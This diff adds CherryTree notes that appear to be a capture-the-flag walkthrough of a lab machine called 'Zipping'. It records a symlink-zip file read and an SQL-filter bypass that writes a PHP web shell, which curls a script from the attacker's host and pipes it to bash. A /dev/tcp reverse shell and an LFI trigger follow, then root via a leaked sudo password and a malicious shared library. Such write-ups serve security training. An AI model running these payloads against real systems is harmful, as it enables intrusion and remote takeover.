@@ -1,0 +1,224 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Zipping" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694584809" ts_lastsave="1694587028">
+    <rich_text>Nmap scan report for 10.129.103.35
+Host is up, received user-set (0.059s latency).
+Scanned at 2023-09-13 02:01:30 EDT for 50s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP6mSkoF2+wARZhzEmi4RDFkpQx3gdzfggbgeI5qtcIseo7h1mcxH8UCPmw8Gx9+JsOjcNPBpHtp2deNZBzgKcA=
+|   256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXXd7dM7wgVC+lrF0+ZIxKZlKdFhG2Caa9Uft/kLXDa
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.54 ((Ubuntu))
+|_http-server-header: Apache/2.4.54 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Zipping | Watch store
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.0
+OS details: Linux 5.0
+TCP/IP fingerprint:
+OS:SCAN(V=7.94%E=4%D=9/13%OT=22%CT=1%CU=34138%PV=Y%DS=2%DC=T%G=Y%TM=6501506
+OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M
+OS:53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%
+OS:O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
+OS:DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
+OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
+OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
+OS:%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
+OS:G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</rich_text>
+    <node name="Enumeration" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694584815" ts_lastsave="1694587195">
+      <rich_text>On port 80, we discover:
+</rich_text>
+      <rich_text link="webs http://10.129.103.35/upload.php">http://10.129.103.35/upload.php</rich_text>
+      <rich_text>.
+
+It states:
+
+
+Ferox:
+
+
+And in shop, we have two files:
+- </rich_text>
+      <rich_text weight="heavy">index.php</rich_text>
+      <rich_text>
+- </rich_text>
+      <rich_text weight="heavy">product.php</rich_text>
+      <rich_text>
+
+We will create a zip of a symlink:
+
+
+We will extract </rich_text>
+      <rich_text weight="heavy">product.php</rich_text>
+      <rich_text> (vulnerable to SQLi):
+
+
+And </rich_text>
+      <rich_text weight="heavy">index.php</rich_text>
+      <rich_text>:
+</rich_text>
+      <codebox char_offset="70" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">The application will only accept zip files, inside them there must be a pdf file containing your curriculum.</codebox>
+      <codebox char_offset="80" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">200      GET       20l      161w    19167c http://10.129.103.35/assets/imgs/avatar2.jpg
+200      GET     1081l     1807w    16450c http://10.129.103.35/assets/vendors/themify-icons/css/themify-icons.css
+200      GET       53l      326w    27609c http://10.129.103.35/assets/imgs/avatar1.jpg
+200      GET      293l     1501w   126456c http://10.129.103.35/assets/imgs/img-2.jpg
+200      GET    11491l    22991w   238590c http://10.129.103.35/assets/css/creative-design.css
+200      GET     7013l    22369w   222911c http://10.129.103.35/assets/vendors/bootstrap/bootstrap.bundle.js
+301      GET        9l       28w      316c http://10.129.103.35/uploads =&gt; http://10.129.103.35/uploads/
+200      GET       32l       75w      877c http://10.129.103.35/assets/js/creative-design.js
+200      GET      162l      483w     4838c http://10.129.103.35/assets/vendors/bootstrap/bootstrap.affix.js
+200      GET      113l      380w     5322c http://10.129.103.35/upload.php
+200      GET       98l      642w    55959c http://10.129.103.35/assets/imgs/service.jpg
+200      GET       79l      474w    34447c http://10.129.103.35/assets/imgs/avatar3.jpg
+200      GET      149l     1103w    98927c http://10.129.103.35/assets/imgs/img-3.jpg
+301      GET        9l       28w      313c http://10.129.103.35/shop =&gt; http://10.129.103.35/shop/
+200      GET      317l     1354w    16738c http://10.129.103.35/index.php
+200      GET    10598l    42768w   280364c http://10.129.103.35/assets/vendors/jquery/jquery-3.4.1.js
+200      GET      317l     1354w    16738c http://10.129.103.35/
+301      GET        9l       28w      315c http://10.129.103.35/assets =&gt; http://10.129.103.35/assets/</codebox>
+      <codebox char_offset="177" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ln -s /var/www/html/shop/product.php lol.pdf
+zip --symlink lol.zip lol.pdf</codebox>
+      <codebox char_offset="230" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?php
+// Check to make sure the id parameter is specified in the URL
+if (isset($_GET['id'])) {
+    $id = $_GET['id'];
+    // Filtering user input for letters or special characters
+    if(preg_match("/^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]\\|;:'\",.&lt;&gt;\/?]|[^0-9]$/", $id, $match)) {
+        header('Location: index.php');
+    } else {
+        // Prepare statement and execute, but does not prevent SQL injection
+        $stmt = $pdo-&gt;prepare("SELECT * FROM products WHERE id = '$id'"); &lt;- vulnerable code
+        $stmt-&gt;execute();
+        // Fetch the product from the database and return the result as an Array
+        $product = $stmt-&gt;fetch(PDO::FETCH_ASSOC);
+        // Check if the product exists (array is not empty)
+        if (!$product) {
+            // Simple error to display if the id for the product doesn't exists (array is empty)
+            exit('Product does not exist!');
+        }
+    }
+} else {
+    // Simple error to display if the id wasn't specified
+    exit('No ID provided!');
+}
+?&gt;
+
+&lt;?=template_header('Zipping | Product')?&gt;
+
+&lt;div class="product content-wrapper"&gt;
+    &lt;img src="assets/imgs/&lt;?=$product['img']?&gt;" width="500" height="500" alt="&lt;?=$product['name']?&gt;"&gt;
+    &lt;div&gt;
+        &lt;h1 class="name"&gt;&lt;?=$product['name']?&gt;&lt;/h1&gt;
+        &lt;span class="price"&gt;
+            &amp;dollar;&lt;?=$product['price']?&gt;
+            &lt;?php if ($product['rrp'] &gt; 0): ?&gt;
+            &lt;span class="rrp"&gt;&amp;dollar;&lt;?=$product['rrp']?&gt;&lt;/span&gt;
+            &lt;?php endif; ?&gt;
+        &lt;/span&gt;
+        &lt;form action="index.php?page=cart" method="post"&gt;
+            &lt;input type="number" name="quantity" value="1" min="1" max="&lt;?=$product['quantity']?&gt;" placeholder="Quantity" required&gt;
+            &lt;input type="hidden" name="product_id" value="&lt;?=$product['id']?&gt;"&gt;
+            &lt;input type="submit" value="Add To Cart"&gt;
+        &lt;/form&gt;
+        &lt;div class="description"&gt;
+            &lt;?=$product['desc']?&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;?=template_footer()?&gt;</codebox>
+      <codebox char_offset="248" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?php
+session_start();
+// Include functions and connect to the database using PDO MySQL
+include 'functions.php';
+$pdo = pdo_connect_mysql();
+// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
+$page = isset($_GET['page']) &amp;&amp; file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
+// Include and show the requested page
+include $page . '.php';
+?&gt;</codebox>
+    </node>
+    <node name="Exploit" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694584829" ts_lastsave="1694588327">
+      <rich_text>The SQL WAF:
+- /^.*[A-Za-z!#$%^&amp;*()\-_=+{}\[\]\\|;:'\",.&lt;&gt;\/?] checks only first line (bypass with newline = %0A)
+- [^0-9]$/ checks if payload ends with number (bypass with #1 = %231)
+
+There are 8 columns, so we have this working payload:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+We will try:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+And payload created with:
+
+
+Then to activate the payload:
+</rich_text>
+      <codebox char_offset="239" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+1' ORDER BY 8; #1 = %231</codebox>
+      <codebox char_offset="254" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+';select '&lt;?php system("curl http://10.10.14.147/rev.sh|bash");?&gt;' into outfile '/var/lib/mysql/breached.php' #1</codebox>
+      <codebox char_offset="282" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.147/9001 0&gt;&amp;1'" &gt; rev.sh</codebox>
+      <codebox char_offset="315" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">curl -s $'http://10.129.103.35/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2fbreached'</codebox>
+    </node>
+    <node name="Privilege Escalation" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694584824" ts_lastsave="1694589585">
+      <rich_text>Initially, we are </rich_text>
+      <rich_text weight="heavy">rektsu</rich_text>
+      <rich_text>.
+SUDO capabilities:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Stock</rich_text>
+      <rich_text> binary asks for password, but we can easily detect the password using </rich_text>
+      <rich_text weight="heavy">strings</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+We will see if it has any strange dependencies:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+We get this error:
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+We will create a </rich_text>
+      <rich_text style="italic">malicious so</rich_text>
+      <rich_text>.
+
+We will use this payload:
+</rich_text>
+      <codebox char_offset="45" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">User rektsu may run the following commands on zipping:
+    (ALL) NOPASSWD: /usr/bin/stock</codebox>
+      <codebox char_offset="133" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"># strings /usr/bin/stock
+------------------------
+St0ckM4nager &lt;- the password
+------------------------</codebox>
+      <codebox char_offset="184" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">strace /usr/bin/stock</codebox>
+      <codebox char_offset="206" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)</codebox>
+      <codebox char_offset="266" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void inject() _attribute_((constructor));
+
+void inject(){
+    system("cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p");
+}</codebox>
+    </node>
+  </node>
+</cherrytree>
